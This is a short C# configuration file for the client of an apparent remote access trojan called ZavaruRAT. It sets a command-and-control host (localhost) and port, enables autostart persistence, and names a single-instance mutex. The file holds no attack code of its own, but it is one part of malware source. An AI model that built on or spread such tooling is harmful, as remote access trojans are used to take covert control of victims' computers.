namespace ZavaruRAT.Client;

// ReSharper disable ConvertToConstant.Global
public static class Config
{
    public static readonly string IP = "localhost";
    public static readonly int Port = 13441;

    #region Features

    public static readonly bool AutoStart = true;

    #endregion

    public static readonly string MutexName = "ZavaruRAT";
    public static readonly string AutoStartName = "ZavaruRAT";
}
